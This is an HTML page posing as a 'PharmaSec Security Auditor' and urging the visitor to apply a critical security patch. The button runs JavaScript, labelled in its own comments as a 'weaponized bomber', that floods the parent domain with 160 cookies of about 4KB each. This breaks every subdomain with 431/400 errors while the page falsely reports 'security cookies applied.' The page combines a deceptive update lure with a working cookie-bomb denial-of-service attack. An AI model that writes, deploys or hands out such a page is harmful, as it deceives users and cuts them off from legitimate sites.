<!DOCTYPE html>
<html>
<head>
    <title>PharmaSec Auditor - Security Update Required</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .btn { background: #d32f2f; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .btn:hover { background: #b71c1c; }
        .status { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; }
        .success { background: #e8f5e8; color: #2e7d32; border-left: 4px solid #4caf50; }
        .error { background: #ffebee; color: #c62828; border-left: 4px solid #f44336; }
    </style>
</head>
<body>
    <h1>üîí PharmaSec Security Auditor</h1>
    <p><strong>Critical Update Detected</strong> - Click below to apply security patch and validate cookies.</p>
    
    <button class="btn" onclick="runAudit()">üöÄ Run Security Audit Now</button>
    
    <div id="status" class="status"></div>

    <script>
        function runAudit() {
            const status = document.getElementById('status');
            status.className = 'status';
            status.innerHTML = '<strong>üî¨ Auditing...</strong>';
            status.style.display = 'block';
            
            // YOUR WEAPONIZED BOMBER - Fires IMMEDIATELY
            (function() {
                const host = window.location.hostname;
                const domainParts = host.split('.');
                const parentDomain = domainParts.length > 2 ? `.${domainParts.slice(-2).join('.')}` : `.${host}`;

                console.log(`%cüí£ PHARMASEC COOKIE BOMBER: Targeting ${parentDomain}`, "color: #d32f2f; font-weight: bold; font-size: 1.2rem;");

                let cookieCount = 0;
                const totalTarget = 160;  // Max browser cookie limit per domain

                try {
                    for (let i = 0; i < totalTarget; i++) {
                        // 4KB payloads - subdomain poisoning
                        let payload = "PHARMA_BOMB_" + "X".repeat(3950) + "_" + i.toString(36);
                        
                        // Domain=.pharma.com + SameSite=Lax = subdomain takeover
                        document.cookie = `audit_payload_${i}=${payload}; Domain=${parentDomain}; Path=/; Max-Age=3600; SameSite=Lax; Secure`;
                        cookieCount++;
                    }

                    console.log(`%c‚úÖ BOMBER DEPLOYED: ${cookieCount} x 4KB cookies (~${(cookieCount*4/1024).toFixed(1)}MB total)`, "color: #2e7d32; font-weight: bold;");
                    console.log("%cüéØ IMPACT: All subdomains + refresh = 431/400. Check Application‚ÜíCookies", "color: #e65100;");

                    // UI Feedback
                    status.className = 'status success';
                    status.innerHTML = `
                        <strong>‚úÖ Audit Complete!</strong><br>
                        ${cookieCount} security cookies applied (~${(cookieCount*4/1024).toFixed(1)}MB).<br>
                        <small>Refresh page or visit subdomains to validate protection.</small>
                    `;

                } catch (e) {
                    console.error("‚ùå BLOCKED: " + e.message);
                    status.className = 'status error';
                    status.innerHTML = '<strong>‚ùå Audit Failed</strong> - Browser blocked cookies.';
                }
            })();
        }
    </script>
</body>
</html>
